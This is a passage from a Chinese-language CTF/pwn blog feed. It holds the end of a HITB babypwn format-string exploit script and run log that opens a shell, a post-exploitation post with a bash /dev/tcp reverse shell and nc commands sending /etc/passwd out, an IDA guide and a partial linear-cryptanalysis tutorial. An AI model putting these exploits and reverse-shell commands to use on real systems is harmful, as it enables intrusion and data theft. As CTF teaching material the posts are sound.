class="number">20</span></div><div class="line">    reader = (dist_to_addr / <span class="number">8</span>) + <span class="number">7</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        diff = (val &amp; <span class="number">0xff</span>) - curout</div><div class="line">        curout = (val &amp; <span class="number">0xff</span>)</div><div class="line">        val /= <span class="number">0x100</span></div><div class="line">        <span class="keyword">if</span> diff &lt; <span class="number">20</span>:</div><div class="line">            diff += <span class="number">0x100</span></div><div class="line">        ret += <span class="string">'%0'</span> + str(diff) + <span class="string">'u'</span></div><div class="line">        ret += <span class="string">'%'</span> + str(reader) + <span class="string">'$hhn'</span></div><div class="line">        reader += <span class="number">1</span></div><div class="line">    ret += <span class="string">'A'</span>*(dist_to_addr - len(ret))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        ret += p64(addr + i)</div><div class="line">    <span class="keyword">return</span> ret</div><div class="line"></div><div class="line">log.info(<span class="string">"SENDING PAYLOAD, PEW PEW !!!"</span>)</div><div class="line">exec_payload(forge_exploit(printf_got, system_addr))</div><div class="line">conn.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line"></div><div class="line">log.success(<span class="string">"ENJOY YOUR SHELL :)"</span>)</div><div class="line">conn.interactive()</div><div class="line"></div><div class="line">conn.close()</div></pre></td></tr></table></figure>
<h3 id="Revealing-its-secret"><a href="#Revealing-its-secret" class="headerlink" title="Revealing its secret"></a>Revealing its secret</h3><p>It’s now time to run our exploit :</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# python exploit.py</div><div class="line"></div><div class="line">[+] Opening connection to 47.75.182.113 on port 9999: Done</div><div class="line">[*] Finding ELF. This might take a few seconds...</div><div class="line">[+] FOUND ELF !</div><div class="line">[*] Using address 0x40076d</div><div class="line">[*] Finding leak point</div><div class="line">[+] FOUND leak point 8</div><div class="line">[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.</div><div class="line">[*] PT_DYNAMIC</div><div class="line">[*] PT_DYNAMIC header = 0x400040</div><div class="line">[*] PT_DYNAMIC count = 0x9</div><div class="line">[*] PT_DYNAMIC @ 0x600e20</div><div class="line">[+] Resolving 'printf' in 'libc.so': 0x7f02b722e168</div><div class="line">[*] Trying lookup based on Build ID: b5381a457906d279073822a5ceb24c4bfef94ddb</div><div class="line">[*] Skipping unavialable libc b5381a457906d279073822a5ceb24c4bfef94ddb</div><div class="line">[*] .gnu.hash/.hash, .strtab and .symtab offsets</div><div class="line">[*] Found DT_GNU_HASH at 0x7f02b7000c00</div><div class="line">[*] Found DT_STRTAB at 0x7f02b7000c10</div><div class="line">[*] Found DT_SYMTAB at 0x7f02b7000c20</div><div class="line">[*] .gnu.hash parms</div><div class="line">[*] hash chain index</div><div class="line">[*] hash chain</div><div class="line">[*] Found DT_GNU_HASH at 0x7f02b7000c00</div><div class="line">[*] Found DT_STRTAB at 0x7f02b7000c10</div><div class="line">[*] Found DT_SYMTAB at 0x7f02b7000c20</div><div class="line">[*] .gnu.hash parms</div><div class="line">[*] hash chain index</div><div class="line">[*] hash chain</div><div class="line">[+] FOUND GOT Address: 0x601000</div><div class="line">[+] FOUND printf@GOT : 0x601020</div><div class="line">[*] SENDING PAYLOAD, PEW PEW !!!</div><div class="line">[+] ENJOY YOUR SHELL :)</div><div class="line">[*] Switching to interactive mode</div><div class="line"><span class="meta">$</span> ls</div><div class="line">babypwn</div><div class="line">bin</div><div class="line">dev</div><div class="line">flag</div><div class="line">lib</div><div class="line">lib32</div><div class="line">lib64</div><div class="line"><span class="meta">$</span> cat flag</div><div class="line">HITB&#123;Baby_Pwn_BabY_bl1nd&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;From &lt;a href=&quot;https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://fbesnard.com/2018/04/
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
      <category term="format string" scheme="http://yoursite.com/tags/format-string/"/>
    
  </entry>
  
  <entry>
    <title>shell之后的操作</title>
    <link href="http://yoursite.com/2018/04/10/shell%E4%B9%8B%E5%90%8E%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://yoursite.com/2018/04/10/shell之后的操作/</id>
    <published>2018-04-09T16:00:26.000Z</published>
    <updated>2018-07-08T01:35:24.968Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>一般拿到shell之后能干什么？当然是反弹shell，然后进行一波扫操作了！但是你做题的时候，是否会遇到没有反弹shell的指令或者shell本身时长有限制，连上一会就断了！</p>
<h3 id="0x01-shell"><a href="#0x01-shell" class="headerlink" title="0x01 shell"></a>0x01 shell</h3><p>首先还是得讲<a href="/2017/12/09/反弹Shell/">反弹shell和正向连接shell</a></p>
<p>前面的这篇文章有了很好的讲解</p>
<h3 id="0x02-延时操作"><a href="#0x02-延时操作" class="headerlink" title="0x02 延时操作"></a>0x02 延时操作</h3><p>若是你上面的操作都不可实现，那么不妨尝试利用下面的指令</p>
<h4 id="timeout指令"><a href="#timeout指令" class="headerlink" title="timeout指令"></a>timeout指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">timeout 3000 /bin/bash</div><div class="line">timeout 3000 /bin/sh</div></pre></td></tr></table></figure>
<p>timeout是linux上常见指令，当你想长时间连上shell不断开的话，不妨使用此命令。</p>
<h4 id="sleep指令"><a href="#sleep指令" class="headerlink" title="sleep指令"></a>sleep指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sleep 3		    终端睡眠3秒</div><div class="line">sleep infinity  终端睡眠无限长事件</div></pre></td></tr></table></figure>
<h3 id="0x03-重定向"><a href="#0x03-重定向" class="headerlink" title="0x03 重定向"></a>0x03 重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&quot;1&gt;&quot; 通常可以省略成 &quot;&gt;&quot;</div><div class="line">1&gt;&amp;2  把正确返回值 传递给 2输出通道 ，&amp;2表示2输出通道 </div><div class="line">2&gt;&amp;1 把错误返回值 传递给1输出通道, 同样&amp;1表示1输出通道. </div><div class="line"></div><div class="line">反弹shell:</div><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div><div class="line">bash -i 一个交互的bash，并且连上具体ip、port，</div><div class="line">&gt;&amp; /dev/tcp/HOST/PORT  表示标准输入与标准输出通过这个连接发出</div><div class="line">0&gt;&amp;1  标准输入通过这个连接读入</div></pre></td></tr></table></figure>
<p><a href="http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/" target="_blank" rel="external">反弹shell的官方解释</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/dev/fd/fd</div><div class="line">If fd is a valid integer, file descriptor fd is duplicated.</div><div class="line"></div><div class="line">/dev/stdin</div><div class="line">File descriptor 0 is duplicated.</div><div class="line"></div><div class="line">/dev/stdout</div><div class="line">File descriptor 1 is duplicated.</div><div class="line"></div><div class="line">/dev/stderr</div><div class="line">File descriptor 2 is duplicated.</div><div class="line"></div><div class="line">/dev/tcp/host/port</div><div class="line">If host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding TCP socket.</div><div class="line"></div><div class="line">/dev/udp/host/port</div><div class="line">If host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding UDP socket.</div></pre></td></tr></table></figure>
<p>&quot;>\&amp;&quot;操作符的含义：</p>
<ul>
<li>在“&gt;&amp;word”语法中，当word不是数字或“-”字符时，“&gt;&amp;”表示标准输出和标准错误重定向到文件，此时与操作符“&amp;&gt;”功能一样。</li>
<li>在“&gt;&amp;word”语法中，当word是数字或“-”字符时，操作符“&gt;&amp;”表示复制输出文件描述符</li>
</ul>
<ul>
<li>&quot;&gt;word&quot; 当word为1的时候，</li>
</ul>
<ul>
<li>“word&lt;”  当word为0，代表后面的输出转为输入；当word为1或2时，其实含义与&quot;&gt;1&quot;或&quot;&gt;2&quot;一致</li>
</ul>
<p>仅有代码”bash -i”时输入输出状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">标准输入、标准输出和标准错误 全部指向shell（此状态定义为状态A）</div><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |</div><div class="line"> ---       +--------+</div><div class="line"> ---       +--------+</div><div class="line">( 1 ) ----&gt;| shell  |</div><div class="line"> ---       +--------+</div><div class="line"> ---       +--------+</div><div class="line">( 2 ) ----&gt;|  shell |</div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>命令“&gt;&amp; /dev/tcp/host/port”是对标准输出和标准错误的重定向，此时的输入输出状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">标准输入指向shell，标准输出和标准错误指向socket连接文件（此状态定义为状态B）</div><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |</div><div class="line"> ---       +--------+</div><div class="line"> ---       +--------+           +------------------+</div><div class="line">( 1 ) ----&gt;| shell  |  -----&gt;   |/dev/tcp/host/port|</div><div class="line"> ---       +--------+    ---&gt;   +------------------+</div><div class="line">      	       	        /</div><div class="line"> ---       +--------+  /</div><div class="line">( 2 ) ----&gt;| shell  | / </div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>因此执行命令“bash -i &gt;&amp; /dev/tcp/host/port”时将标准输出和标准错误进行了重定向,使标准输出和标准错误指向socket连接文件，标准输入指向原有shell不变。</p>
<p>使用命令“bash -i &gt;&amp; /dev/tcp/host/port”还不能反弹shell，因为此时的输入还是指向shell，此时会出现在被控端（执行反弹shell命令的终端）执行命令，在控制端（监听端口的终端）回显得现象。</p>
<p>命令“0&gt;&amp;1”是对文件描述符的拷贝，是将0[标准输入]重定向到了1[标准输出]指向的位置，此时1[标准输出]指向的是socket连接文件，重定向完成后，0[标准输入]也指向了socket连接文件，状态如下</p>
<blockquote>
<p>在状态B时，2[标准错误]指向的也是socket连接文件，因此命令”0&gt;&amp;2”与“0&gt;&amp;1”执行完后结果是一样的,所以反弹shell命令可以写成“bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;2”</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">标准输入、标准输出和标准错误全部指向socket连接文件（此状态定义为状态C）</div><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |\</div><div class="line"> ---       +--------+ \</div><div class="line">                       \</div><div class="line"> ---       +--------+    ---&gt;   +------------------+</div><div class="line">( 1 ) ----&gt;| shell  |  -----&gt;   |/dev/tcp/host/port|</div><div class="line"> ---       +--------+    ---&gt;   +------------------+</div><div class="line">      	       	        /</div><div class="line"> ---       +--------+  /</div><div class="line">( 2 ) ----&gt;| shell  | / </div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>命令”bash -i 5\&lt;>/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5”也可以反弹shell</p>
<p>说明：\&lt;>代表的是输入输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |\</div><div class="line"> ---       +--------+ \</div><div class="line">                       \</div><div class="line"> ---       +--------+    ---&gt;  ---    ------1-----&gt;   +------------------+</div><div class="line">( 1 ) ----&gt;| shell  |  -----&gt; ( 5 )                   |/dev/tcp/host/port|</div><div class="line"> ---       +--------+    ---&gt;  ---    &lt;-----0------   +------------------+</div><div class="line">      	       	        /</div><div class="line"> ---       +--------+  /</div><div class="line">( 2 ) ----&gt;| shell  | / </div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>其他参考文档</p>
<p><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html" target="_blank" rel="external">https://www.gnu.org/software/bash/manual/html_node/Redirections.html</a></p>
<h3 id="0x04-下载文件"><a href="#0x04-下载文件" class="headerlink" title="0x04 下载文件"></a>0x04 下载文件</h3><p>一般linux上或多或少会支持一些命令wget、curl等，当这些命令存在时就可以完成文件的下载。</p>
<p>但是特殊情况下是这些命令都不存在。下面讲一讲其他办法：</p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">接受: ip:192.168.228.221 1234 passwd.txt    </div><div class="line">发送: ip:192.168.228.222 1234 /etc/passwd</div><div class="line"></div><div class="line">方法一：</div><div class="line">接受方</div><div class="line">nc -l 1234 |tar -zxvf -</div><div class="line">发送方</div><div class="line">tar -zcvf - dir |nc 192.168.228.221 1234</div><div class="line"></div><div class="line">方法二：</div><div class="line">接受方</div><div class="line">nc -l 1234 &gt; passwd.txt</div><div class="line">发送方</div><div class="line">nc 192.168.228.221 1234 &lt; /etc/passwd</div></pre></td></tr></table></figure>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">import urllib</div></pre></td></tr></table></figure>
<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p>一般的虚拟机上都会有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><p>上面重定向讲得十分透彻，所以这儿就可以快速写出对应的bash脚本了(最终屈服了，没写出来，仍然用的反弹的shell)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">将/usr/bin/curl 转化为16进制值，切片追加传输</div><div class="line"></div><div class="line">echo 0x31323334 |xxd -r </div><div class="line">1234</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;cat &lt;&lt; EOF &gt; hex2str\n#!/bin/sh\nI=0\nwhile [ \$I -lt \$&#123;#1&#125; ];\ndo\n    echo -en \&quot;\\x\&quot;\$&#123;1:\$I:2&#125;\n    let \&quot;I += 2\&quot;\ndone\n\nEOF\n&quot;</div></pre></td></tr></table></figure>
<p>也即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">cat &lt;&lt; EOF &gt; hex2str</div><div class="line">#!/bin/sh</div><div class="line">I=0</div><div class="line">while [ $I -lt $&#123;#1&#125; ];</div><div class="line">do</div><div class="line">    echo -en &quot;\x&quot;$&#123;1:$I:2&#125;</div><div class="line">    let &quot;I += 2&quot;</div><div class="line">done</div><div class="line">EOF</div></pre></td></tr></table></figure>
<blockquote>
<p>$hex2str 313233</p>
<p>123$</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;一般拿到shell之后能干什么？当然是反弹shell，然后进行一波扫操作了！但是你做题的时候，是否会
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>IDA使用指南</title>
    <link href="http://yoursite.com/2018/04/08/IDA%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2018/04/08/IDA使用指南/</id>
    <published>2018-04-08T09:17:36.000Z</published>
    <updated>2018-04-08T11:28:33.550Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>IDA之于逆向人员、PWN手的重要性几乎等同于左右手之于人。所以学好IDA是我们关键的一步。</p>
<h3 id="0x02-基本快捷键"><a href="#0x02-基本快捷键" class="headerlink" title="0x02 基本快捷键"></a>0x02 基本快捷键</h3><h4 id="2-1-View"><a href="#2-1-View" class="headerlink" title="2.1 View"></a>2.1 View</h4><h4 id="2-2-Jump"><a href="#2-2-Jump" class="headerlink" title="2.2 Jump"></a>2.2 Jump</h4><ul>
<li>Esc   jump to previous position</li>
<li>Ctrl+Enter  jump to next postion</li>
</ul>
<h3 id="0x03-patch"><a href="#0x03-patch" class="headerlink" title="0x03 patch"></a>0x03 patch</h3><p>以前逆向的时候，为了将有些部分的jz改为jnz，我们很可能会关闭IDA-gui，在UltraEdit中找到指定位置进行更改。这种操作十分麻烦，而且费时，所以产生了一下的方法！</p>
<ol>
<li><strong>在IDA安装目录中，找到cfg/idagui.cfg，更改“ApplyPatches”改为1</strong></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">原来：</div><div class="line">&quot;ApplyPatches&quot;          =       0            // apply patches to input file</div><div class="line">现在</div><div class="line">&quot;ApplyPatches&quot;          =       1            // apply patches to input file</div></pre></td></tr></table></figure>
<ol start="2">
<li>如果想patch某个代码段，在<strong>IDA View窗口</strong>将光标指向对应的汇编代码，这时会发现在<strong>Hex View窗口</strong> 中对应汇编代码的16进制会突出显示。<strong>右键选择Edit（或者直接用F2）</strong>，即可对目标代码进行更改；<strong>最后右键选择Apply Changes（或者使用F2）</strong> 即可完成更改</li>
<li>patch之后，你可以直接看到patch更改后对应的汇编代码，也能继续调试</li>
</ol>
<h4 id="3-1-Change-byte"><a href="#3-1-Change-byte" class="headerlink" title="3.1 Change byte"></a>3.1 Change byte</h4><p>在Hex View窗口中右键更改</p>
<p>Edit-&gt;Patch Program -&gt;Change byte</p>
<h4 id="3-2-Change-word"><a href="#3-2-Change-word" class="headerlink" title="3.2 Change word"></a>3.2 Change word</h4><p>改字节  Edit-&gt;Patch Program -&gt;Change word</p>
<h4 id="3-3-Assemble"><a href="#3-3-Assemble" class="headerlink" title="3.3 Assemble"></a>3.3 Assemble</h4><p>Edit-&gt;Patch Program -&gt;Assemble</p>
<h4 id="3-4-Apply-patches-to-input-file"><a href="#3-4-Apply-patches-to-input-file" class="headerlink" title="3.4 Apply patches to input file"></a>3.4 Apply patches to input file</h4><p>Edit-&gt;Patch Program -&gt;Apply patches to input file</p>
<h3 id="0x04-Debug"><a href="#0x04-Debug" class="headerlink" title="0x04 Debug"></a>0x04 Debug</h3><h4 id="4-1-远程调试"><a href="#4-1-远程调试" class="headerlink" title="4.1 远程调试"></a>4.1 远程调试</h4><blockquote>
<ol>
<li>IDA 7.0给了很多远程调试器（dbgsrv文件夹下），只需要将与系统程序对应的server放到被调试的文件目录下即可。</li>
<li>运行该server</li>
<li>在IDA中启动对应的远程调试器，选择Debugger-&gt;Process Options，更改Application、Input File、Directory、Parameters、Hostname、Port、Password</li>
</ol>
</blockquote>
<h4 id="4-2-调试快捷键"><a href="#4-2-调试快捷键" class="headerlink" title="4.2 调试快捷键"></a>4.2 调试快捷键</h4><ul>
<li>F7 - step into</li>
<li>F8 - step over</li>
<li>F9 - start Process</li>
<li>F4 - Run to Cursor</li>
<li>Ctrl + F7  -  Run until Return</li>
<li>Ctrl + F2 - Terminate Process</li>
</ul>
<h4 id="4-3-Debug-View"><a href="#4-3-Debug-View" class="headerlink" title="4.3 Debug View"></a>4.3 Debug View</h4><p>如果你调试过程序，你会发现调试窗口其实是一个独立的多窗口环境，这里面有IDA View-RIP，General registers，Hex View，Stack View，Output window，Python输入框</p>
<h5 id="4-3-1-窗口布局"><a href="#4-3-1-窗口布局" class="headerlink" title="4.3.1 窗口布局"></a>4.3.1 窗口布局</h5><p>建议使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;           [IDA View-RIP]                  &#125; &#123; [General registers] [Hex View] [Stack View]&#125;</div><div class="line">&#123;           output window                                                                  &#125;</div><div class="line">&#123;Python [                                                                                 ]&#125;</div></pre></td></tr></table></figure>
<h5 id="4-3-2-IDA-View-RIP"><a href="#4-3-2-IDA-View-RIP" class="headerlink" title="4.3.2 IDA View-RIP"></a>4.3.2 IDA View-RIP</h5><p>该窗口支持多种显示，其中有静态分析的跳转图(Graph View)，也有汇编文本(Text View)</p>
<p>所有调整都可以通过右键触发</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;IDA之于逆向人员、PWN手的重要性几乎等同于左右手之于人。所以学好IDA是我们关键的一步。&lt;/p&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="ida" scheme="http://yoursite.com/tags/ida/"/>
    
      <category term="调试" scheme="http://yoursite.com/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>线性分析法</title>
    <link href="http://yoursite.com/2018/04/03/%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90%E6%B3%95/"/>
    <id>http://yoursite.com/2018/04/03/线性分析法/</id>
    <published>2018-04-03T11:26:53.000Z</published>
    <updated>2018-04-03T18:04:07.627Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h3><p>线性分析法、差分分析法作为SPN(Substitution Permutation Network)的常用解法，一直让密码学家痴迷。最近也因为0ctf的一些密码学题目，对线性分析法有了一定的了解，并想写篇博客将具体内容详细展示！</p>
<h3 id="0x01-SPN网络介绍"><a href="#0x01-SPN网络介绍" class="headerlink" title="0x01 SPN网络介绍"></a>0x01 SPN网络介绍</h3><p>首先我们来看看这个spn网络</p>
<p><img src="\images\2018-04-03\1.png" alt="spn网络"></p>
<p>每轮都包含3个步骤：substitution（代替）、permutation（置换）、key-mixing（轮密钥加）</p>
<h4 id="1-1-substitution"><a href="#1-1-substitution" class="headerlink" title="1.1 substitution"></a>1.1 substitution</h4><p>输入4比特，输出4比特。这是一个双射，让集合$0-(2^4-1)$ 与其本身一一对应。</p>
<table>
<thead>
<tr>
<th>input</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
</tr>
</thead>
<tbody>
<tr>
<td>output</td>
<td>E</td>
<td>4</td>
<td>D</td>
<td>1</td>
<td>2</td>
<td>F</td>
<td>B</td>
<td>8</td>
<td>3</td>
<td>A</td>
<td>6</td>
<td>C</td>
<td>5</td>
<td>9</td>
<td>0</td>
<td>7</td>
</tr>
</tbody>
</table>
<p>它起到混淆的作用！</p>
<h4 id="1-2-permutation"><a href="#1-2-permutation" class="headerlink" title="1.2 permutation"></a>1.2 permutation</h4><p>输入16比特的数，对其各个比特进行置换。</p>
<table>
<thead>
<tr>
<th>input</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>10</th>
<th>11</th>
<th>12</th>
<th>13</th>
<th>14</th>
<th>15</th>
<th>16</th>
</tr>
</thead>
<tbody>
<tr>
<td>output</td>
<td>1</td>
<td>5</td>
<td>9</td>
<td>13</td>
<td>2</td>
<td>6</td>
<td>10</td>
<td>14</td>
<td>3</td>
<td>7</td>
<td>11</td>
<td>15</td>
<td>4</td>
<td>8</td>
<td>12</td>
<td>16</td>
</tr>
</tbody>
</table>
<p>其实可以看出，这是对上面4组S盒输出的16个比特进行简单的置换。</p>
<p>这是一个可逆的操作！</p>
<h4 id="1-3-轮密钥加"><a href="#1-3-轮密钥加" class="headerlink" title="1.3 轮密钥加"></a>1.3 轮密钥加</h4><p>提到轮密钥加，我们不得不提轮密钥的产生。一般的轮密钥产生都是利用一种具有雪崩效应的算法，根据初始密钥，生成每一轮的密钥！比较少见的是给出一段较长的密钥，直接切割出每轮的密钥。</p>
<p>最好不要出现以下几种密钥：</p>
<blockquote>
<ol>
<li>简单密钥。对于使用的0000....00或者0101..0101类型的密钥，最好不要使用</li>
<li>可通过某一轮的密钥反解出所有密钥。（前提是你知道某一轮的密钥。。。）</li>
<li>轮密钥不要相关。如果轮密钥只是简单的进行了固定的循环左移或右移变换，那么所有的密钥将会有相同数量的1，以及相同距离的1。这都是很危险的。<a href="https://en.wikipedia.org/wiki/Related-key_attack" target="_blank" rel="external">Related-key attack</a></li>
</ol>
</blockquote>
<h4 id="1-4-解密"><a href="#1-4-解密" class="headerlink" title="1.4 解密"></a>1.4 解密</h4><p>其实，由于上面的所有变换都是可逆的运算，所以最终都能根据轮密码求解出原文。</p>
<h3 id="0x02-线性分析法简述"><a href="#0x02-线性分析法简述" class="headerlink" title="0x02 线性分析法简述"></a>0x02 线性分析法简述</h3><p>线性分析法的基本想法是生成一系列大概可用的线性表达式，如：</p>
<p>$X_{i_1}\oplus X_{i_2} ... X_{i_u} \oplus Y_{j_1} \oplus Y_{j_2} ... Y_{j_v}=0$</p>
<p>其中 $X_i$ 表示第i个比特的输入，$Y_j$ 表示第j个比特的输出</p>
<p>其实当我们比较随机的选取这u+v个比特，最终上述表达式成功的概率大概是1/2。</p>
<p><strong>线性分析法基本原理：如果线性表达式成立的概率距离1/2越远，那么越容易使用线性分析法。若线性表达式发生概率为$p_L$， 那么$|p_L-1/2|$越大越好。</strong></p>
